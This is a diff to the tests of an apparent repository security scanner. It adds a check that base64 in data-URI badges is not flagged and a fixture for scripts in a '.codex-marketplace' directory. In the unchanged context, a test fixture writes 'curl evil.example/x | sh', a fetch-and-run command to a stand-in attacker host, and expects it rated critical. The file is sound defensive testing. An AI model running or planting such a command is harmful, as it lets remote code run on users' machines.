@@ -52,6 +52,24 @@ def test_many_base64_blobs_in_one_file_collapse_to_one_finding(tmp_path):
     assert len(scan_file_for_base64_blobs(few_path)) == 2
 
 
+def test_data_uri_base64_is_not_flagged(tmp_path):
+    # Regression test: shields.io-style custom-logo badges embed an SVG as
+    # data:image/svg+xml;base64,<blob> — found flagged identically to an actual
+    # self-decoding payload on 3 independent README.md files during the launch
+    # scan. A blob NOT preceded by a data: URI prefix must still be flagged.
+    blob = "A" * 200
+    path = tmp_path / "README.md"
+    path.write_text(
+        f"![badge](https://img.shields.io/badge/x-y?logo=data:image/svg%2Bxml;base64,{blob})\n"
+        f"and separately a suspicious blob: {blob}\n",
+        encoding="utf-8",
+    )
+
+    findings = scan_file_for_base64_blobs(path)
+    assert len(findings) == 1
+    assert findings[0].detail.startswith("A" * 60)
+
+
 def test_dev_tooling_hidden_executables_are_downgraded_not_suppressed(tmp_path):
     # Regression test: real (not .sample) hook/CI scripts under conventional
     # maintainer-tooling directories (.github/, .githooks/, .claude/hooks/) were
@@ -70,6 +88,10 @@ def test_dev_tooling_hidden_executables_are_downgraded_not_suppressed(tmp_path):
     githooks.mkdir()
     (githooks / "pre-commit").write_text("#!/bin/sh\necho hook\n", encoding="utf-8")
 
+    codex_marketplace = tmp_path / ".codex-marketplace" / "scripts"
+    codex_marketplace.mkdir(parents=True)
+    (codex_marketplace / "post.py").write_text("#!/usr/bin/env python3\nprint('hi')\n", encoding="utf-8")
+
     (tmp_path / ".weird-backup-dir").mkdir()
     (tmp_path / ".weird-backup-dir" / "payload.sh").write_text(
         "#!/bin/sh\ncurl evil.example/x | sh\n", encoding="utf-8"
@@ -80,6 +102,7 @@ def test_dev_tooling_hidden_executables_are_downgraded_not_suppressed(tmp_path):
 
     assert hidden["/.github/scripts/lint.sh"].severity == Severity.MEDIUM
     assert hidden["/.githooks/pre-commit"].severity == Severity.MEDIUM
+    assert hidden["/.codex-marketplace/scripts/post.py"].severity == Severity.MEDIUM
     assert hidden["/.weird-backup-dir/payload.sh"].severity == Severity.CRITICAL
 
 
